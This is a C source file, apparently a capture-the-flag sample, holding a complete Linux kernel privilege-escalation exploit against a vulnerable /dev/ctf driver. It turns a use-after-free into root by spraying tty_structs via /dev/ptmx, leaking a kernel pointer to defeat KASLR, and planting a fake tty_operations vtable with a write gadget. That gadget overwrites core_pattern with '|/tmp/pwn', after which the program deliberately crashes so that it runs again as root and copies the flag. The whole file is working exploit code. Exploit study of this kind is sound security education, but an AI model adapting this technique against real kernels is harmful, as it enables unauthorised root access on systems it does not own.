/*
  Copyright 2021 Google LLC

  Licensed under the Apache License, Version 2.0 (the "License");
  you may not use this file except in compliance with the License.
  You may obtain a copy of the License at

      https://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
*/
#include <assert.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
#define SPRAY_SIZE 100
#undef NDEBUG

#define TTY_STRUCT_SIZE 0x2b8
#define TTY_STRUCT_CHUNK_SIZE 1024
const int tty_magic = 0x5401;

// Update these if you recompile the kernel. These are
// symbols in Linux, you should be able to get them with nm if you compile
// the kernel with debug symbols.
const uint64_t ptm_unix98_ops_base = 0xffffffff820745e0;
const uint64_t core_pattern_base = 0xffffffff8255f7a0;
// 0xffffffff8120fc32 : mov dword ptr [rdx + 0x100], esi ; ret.
// You can find gadgets like this with ropper or another gadget search tool
const uint64_t write_gadget_base = 0xffffffff8120fc32;

const char pattern[12] = "|/tmp/pwn";

int main(void)
{
  if (getuid() == 0) {
    system("cat /dev/vdb > /tmp/flag && chmod 666 /tmp/flag");
    return 0;
  }

  int fd = open("/dev/ctf", O_RDWR);
  if (fd < 0) {
    perror("Failed to open /dev/ctf");
    return -1;
  }

  // Allocate something
  assert(ioctl(fd, 1337, TTY_STRUCT_CHUNK_SIZE) == 0);
  // Free it
  assert(ioctl(fd, 1338, 0) == 0);

  // Spray tty_structs
  int sprayfd[SPRAY_SIZE];
  for (int i = 0; i < SPRAY_SIZE; i++) {
    sprayfd[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (sprayfd[i] < 0) {
      printf("open ptmx returned %d: %s\n", errno, strerror(errno));
    }
    assert(sprayfd[i] >= 0);
  }

  int magic_leak;
  assert(read(fd, &magic_leak, sizeof(magic_leak)) == sizeof(magic_leak));
  assert(magic_leak == tty_magic);

  uint64_t hax[TTY_STRUCT_CHUNK_SIZE / 8];
  assert(read(fd, hax, sizeof(hax)) == sizeof(hax));
  uint64_t ptm_unix98_ops = hax[3];
  printf("tty_ops: %#lx\n", ptm_unix98_ops);

  uint64_t kernel_slide = ptm_unix98_ops - ptm_unix98_ops_base;
  uint64_t core_pattern = kernel_slide + core_pattern_base;
  uint64_t write_gadget = kernel_slide + write_gadget_base;
  printf("core_pattern: %#lx\n", core_pattern);

  // atomic_write_lock.wait_list should be empty
  assert(hax[7] == hax[8]);
  uint64_t tty_struct_addr = hax[7] - 0x38;
  printf("tty_struct: %#lx\n", tty_struct_addr);

  uint64_t *fake_vtable = &hax[TTY_STRUCT_SIZE / 8];
  memset(fake_vtable, 0x41, 33 * sizeof(uint64_t));

  // ioctl
  fake_vtable[12] = write_gadget;
  // close
  fake_vtable[4] = 0;
  // shutdown
  fake_vtable[5] = 0;
  // cleanup
  fake_vtable[6] = 0;

  hax[3] = tty_struct_addr + TTY_STRUCT_SIZE;
  assert(write(fd, hax, sizeof(hax)) == sizeof(hax));

  ioctl(sprayfd[0], *(uint32_t *)&pattern[0], core_pattern - 0x100);
  ioctl(sprayfd[0], *(uint32_t *)&pattern[4], core_pattern + 4 - 0x100);
  ioctl(sprayfd[0], *(uint32_t *)&pattern[8], core_pattern + 8 - 0x100);

  // Crash and run ourselves as the core handler
  asm volatile("ud2");
  return 0;
}
